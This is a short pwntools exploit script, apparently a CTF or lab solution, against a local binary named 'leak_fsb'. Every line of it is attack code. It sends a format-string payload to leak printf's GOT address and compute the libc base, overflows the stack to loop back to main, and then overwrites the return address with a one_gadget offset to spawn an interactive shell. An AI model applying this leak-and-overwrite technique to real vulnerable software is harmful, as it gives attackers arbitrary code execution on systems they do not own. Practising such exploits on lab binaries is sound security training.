from pwn import *

p = process('./leak_fsb')
e = ELF('./leak_fsb')
l = e.libc

oneshot = 0x45226

payload = '%7$s'.ljust(8,'\x00')
payload += p64(e.got['printf'])
payload = payload.ljust(0x20+8, '\x00')
payload += p64(e.symbols['main'])
p.send(payload)
libc = u64(p.recvuntil('\x7f')[-6:] + '\x00\x00') - l.symbols['printf']

sleep(0.3)

p.send('A'*0x28 + p64(libc+oneshot))
p.interactive()